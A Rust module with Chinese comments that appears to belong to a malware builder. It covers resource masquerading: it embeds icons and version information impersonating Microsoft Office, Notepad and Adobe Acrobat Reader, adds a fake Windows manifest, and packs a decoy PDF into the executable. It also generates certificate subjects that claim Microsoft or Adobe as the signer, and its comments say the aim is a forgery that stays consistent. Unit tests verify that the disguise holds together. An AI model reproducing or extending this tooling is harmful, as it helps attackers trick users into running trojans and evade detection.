//! 资源伪装：图标、VERSIONINFO、应用清单、诱饵 PDF。
//!
//! 核心原则：**三处身份必须自洽** —— 图标画的、版本信息写的、证书签的，
//! 三者指向同一个厂商。旧实现里默认是「图标=记事本、版本信息=Microsoft、
//! 签名者=Document Viewer」，互相矛盾，等于自证伪造。

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::builder::tools::{find, windres};
use crate::builder::LIB_ICONS;

/// 版本信息里的字符串：与所选图标保持一致。
pub fn preset_meta(spec: &str) -> (&'static str, &'static str, &'static str) {
    let n = spec.strip_prefix("lib:").unwrap_or(spec);
    match n {
        "notepad" => ("Microsoft Corporation", "Notepad", "NOTEPAD.EXE"),
        "word" => ("Microsoft Corporation", "Microsoft Word", "WINWORD.EXE"),
        "excel" => ("Microsoft Corporation", "Microsoft Excel", "EXCEL.EXE"),
        "ppt" => ("Microsoft Corporation", "Microsoft PowerPoint", "POWERPNT.EXE"),
        "pdf" | "pdf-2" | "pdf-3" => ("Adobe Inc.", "Adobe Acrobat Reader", "AcroRd32.exe"),
        _ => ("", "Application", "app.exe"),
    }
}

/// 证书主题：必须与 VERSIONINFO 的 CompanyName 一致。
pub fn preset_subject(spec: &str) -> String {
    let (company, product, _) = preset_meta(spec);
    if company.is_empty() {
        return d_subj();
    }
    // 两家预设厂商都注册在美国；自定义厂商时沿用 US 比留空更像正常软件。
    let country = match company {
        "Adobe Inc." => "US",
        _ => "US",
    };
    format!("/C={country}/O={company}/CN={product}")
}

pub fn d_subj() -> String {
    "/C=US/O=Document Viewer/CN=Document Viewer".into()
}

/// 决定最终使用的证书主题：显式指定优先，否则按图标预设推导。
pub fn resolve_subject(opts: &crate::builder::GenOpts) -> String {
    let s = opts.cert_subject.trim();
    if !s.is_empty() {
        s.to_string()
    } else {
        preset_subject(opts.icon.trim())
    }
}

/// 把任意 png/jpg 转成多尺寸 .ico（借 macOS 自带 sips 缩放，再手工组 ICO 容器）
pub fn ico_from_image(src: &str, tmp: &Path) -> Result<Vec<u8>, String> {
    let sips = find(&["sips"]).unwrap_or_else(|| "sips".to_string());
    let mut pngs: Vec<(u32, Vec<u8>)> = Vec::new();
    for s in [16u32, 32, 48, 64, 128, 256] {
        let dst = tmp.join(format!("s{s}.png"));
        let ok = Command::new(&sips)
            .args(["-z", &s.to_string(), &s.to_string(), src, "--out"])
            .arg(&dst)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if !ok {
            continue;
        }
        if let Ok(d) = fs::read(&dst) {
            if d.len() > 8 && &d[1..4] == b"PNG" {
                pngs.push((s, d));
            }
        }
    }
    if pngs.is_empty() {
        return Err("图片转换失败（缺 sips 或不支持的格式）".into());
    }
    let n = pngs.len();
    let mut out = Vec::new();
    out.extend_from_slice(&0u16.to_le_bytes()); // reserved
    out.extend_from_slice(&1u16.to_le_bytes()); // type = icon
    out.extend_from_slice(&(n as u16).to_le_bytes());
    let mut off = 6 + 16 * n;
    for (s, d) in &pngs {
        let b = if *s >= 256 { 0u8 } else { *s as u8 };
        out.push(b);
        out.push(b);
        out.push(0);
        out.push(0);
        out.extend_from_slice(&1u16.to_le_bytes()); // planes
        out.extend_from_slice(&32u16.to_le_bytes()); // bpp
        out.extend_from_slice(&(d.len() as u32).to_le_bytes());
        out.extend_from_slice(&(off as u32).to_le_bytes());
        off += d.len();
    }
    for (_, d) in &pngs {
        out.extend_from_slice(d);
    }
    Ok(out)
}

/// 按图标规格取出 ico 字节（内置库 or 外部文件）
pub fn icon_bytes(spec: &str, tmp: &Path) -> Result<Vec<u8>, String> {
    if let Some(name) = spec.strip_prefix("lib:") {
        return LIB_ICONS
            .iter()
            .find(|(n, _)| *n == name)
            .map(|(_, b)| b.to_vec())
            .ok_or_else(|| format!("图标库中找不到 {name}"));
    }
    let p = Path::new(spec);
    if !p.exists() {
        return Err(format!("图标文件不存在: {spec}"));
    }
    let ext = p
        .extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    if ext == "ico" {
        fs::read(p).map_err(|e| e.to_string())
    } else {
        ico_from_image(spec, tmp)
    }
}

/// 编译资源对象：图标 / 版本信息 / 应用清单 / 诱饵 PDF。
/// full=true 时同时写入 VERSIONINFO 与 RT_MANIFEST，让 exe 在资源层面像正常程序。
pub fn build_res_obj(
    icon: Option<&str>,
    tmp: &Path,
    arch: &str,
    full: bool,
    decoy: Option<&str>,
) -> Result<PathBuf, String> {
    let mut rc_text = String::new();
    let mut meta_src = String::new();

    if let Some(spec) = icon {
        let ico_bytes = icon_bytes(spec, tmp)?;
        fs::write(tmp.join("app.ico"), &ico_bytes).map_err(|e| e.to_string())?;
        rc_text.push_str("1 ICON \"app.ico\"\n");
        meta_src = spec.to_string();
    }

    if full {
        let (company, desc, orig) = preset_meta(&meta_src);
        rc_text.push_str(&format!(
            "1 VERSIONINFO\n\
             FILEVERSION 6,1,7601,17514\n\
             PRODUCTVERSION 6,1,7601,17514\n\
             FILEOS 0x40004L\n\
             FILETYPE 0x1L\n\
             BEGIN\n\
             \x20 BLOCK \"StringFileInfo\"\n\
             \x20 BEGIN\n\
             \x20   BLOCK \"040904B0\"\n\
             \x20   BEGIN\n\
             \x20     VALUE \"CompanyName\", \"{company}\"\n\
             \x20     VALUE \"FileDescription\", \"{desc}\"\n\
             \x20     VALUE \"FileVersion\", \"6.1.7601.17514\"\n\
             \x20     VALUE \"InternalName\", \"{orig}\"\n\
             \x20     VALUE \"OriginalFilename\", \"{orig}\"\n\
             \x20     VALUE \"ProductName\", \"{desc}\"\n\
             \x20     VALUE \"ProductVersion\", \"6.1.7601.17514\"\n\
             \x20   END\n\
             \x20 END\n\
             \x20 BLOCK \"VarFileInfo\"\n\
             \x20 BEGIN\n\
             \x20   VALUE \"Translation\", 0x409, 1200\n\
             \x20 END\n\
             END\n"
        ));
        let manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\
<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n\
<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.App\" version=\"6.1.7601.17514\" processorArchitecture=\"*\"/>\n\
<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>\n\
<dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"/></dependentAssembly></dependency>\n\
</assembly>\n";
        fs::write(tmp.join("app.manifest"), manifest).map_err(|e| e.to_string())?;
        rc_text.push_str("1 24 \"app.manifest\"\n");
    }

    // 诱饵 PDF：作为 RCDATA(id=2) 塞进 .rsrc
    if let Some(d) = decoy {
        let src = Path::new(d);
        if !src.exists() {
            return Err(format!("诱饵 PDF 不存在: {d}"));
        }
        let bytes = fs::read(src).map_err(|e| e.to_string())?;
        if bytes.len() < 5 || &bytes[0..5] != b"%PDF-" {
            return Err("诱饵文件不是合法 PDF（缺少 %PDF- 头）".into());
        }
        fs::write(tmp.join("decoy.pdf"), &bytes).map_err(|e| e.to_string())?;
        rc_text.push_str("2 RCDATA \"decoy.pdf\"\n");
    }

    let rc = tmp.join("app.rc");
    fs::write(&rc, rc_text).map_err(|e| e.to_string())?;

    let wr = windres(arch).ok_or("未找到 windres（mingw 资源编译器）")?;
    let obj = tmp.join("app_icon.o");
    let o = Command::new(&wr)
        .current_dir(tmp)
        .args(["app.rc", "-O", "coff", "-o"])
        .arg(&obj)
        .output()
        .map_err(|e| e.to_string())?;
    if !o.status.success() {
        return Err(format!("windres 失败: {}", String::from_utf8_lossy(&o.stderr)));
    }
    Ok(obj)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::builder::GenOpts;

    fn mk(icon: &str, subj: &str) -> GenOpts {
        GenOpts {
            icon: icon.into(),
            cert_subject: subj.into(),
            ..Default::default()
        }
    }

    #[test]
    fn subject_matches_icon_preset() {
        for icon in ["lib:notepad", "lib:word", "lib:excel", "lib:ppt", "lib:pdf"] {
            let (company, product, _) = preset_meta(icon);
            let subj = preset_subject(icon);
            assert!(
                subj.contains(&format!("O={company}")),
                "图标 {icon}: 证书主题 {subj} 未包含厂商 {company}"
            );
            assert!(
                subj.contains(&format!("CN={product}")),
                "图标 {icon}: 证书主题 {subj} 未包含产品名 {product}"
            );
            assert!(subj.starts_with("/C="), "主题必须是 OpenSSL 的 /C= 形式: {subj}");
        }
    }

    #[test]
    fn resolve_subject_honors_explicit_value() {
        assert_eq!(resolve_subject(&mk("lib:notepad", "")), preset_subject("lib:notepad"));
        assert_eq!(resolve_subject(&mk("lib:notepad", "/CN=Custom")), "/CN=Custom");
    }

    /// 这是本次修的核心缺陷：换图标必须换证书。
    /// 旧实现把 subject 当成「证书生成的输入」，但缓存又按固定文件名命中，
    /// 于是换图标后 still 用旧证书 —— 签名者与版本信息再次对不上。
    #[test]
    fn changing_icon_changes_subject() {
        let a = resolve_subject(&mk("lib:notepad", ""));
        let b = resolve_subject(&mk("lib:pdf", ""));
        assert_ne!(a, b, "notepad 与 pdf 的证书主题必须不同");
        assert!(a.contains("Microsoft"));
        assert!(b.contains("Adobe"));
    }

    #[test]
    fn unknown_icon_falls_back_to_generic() {
        let (c, p, f) = preset_meta("/tmp/custom.ico");
        assert_eq!(c, "");
        assert_eq!(p, "Application");
        assert_eq!(f, "app.exe");
        // 通用图标也必须给出一个能用的主题，不能是空串
        let s = preset_subject("/tmp/custom.ico");
        assert!(s.starts_with("/C="), "{s}");
    }

    #[test]
    fn icon_library_lookup() {
        let tmp = std::env::temp_dir();
        let b = icon_bytes("lib:word", &tmp).expect("lib:word 应能取到");
        assert!(&b[..4] == &[0, 0, 1, 0], "不是合法 ICO 头");
        assert!(icon_bytes("lib:nope", &tmp).is_err());
    }

    #[test]
    fn missing_icon_file_errors_clearly() {
        let e = icon_bytes("/no/such/file.png", &std::env::temp_dir())
            .expect_err("缺失文件必须报错");
        assert!(e.contains("不存在"), "{e}");
    }
}
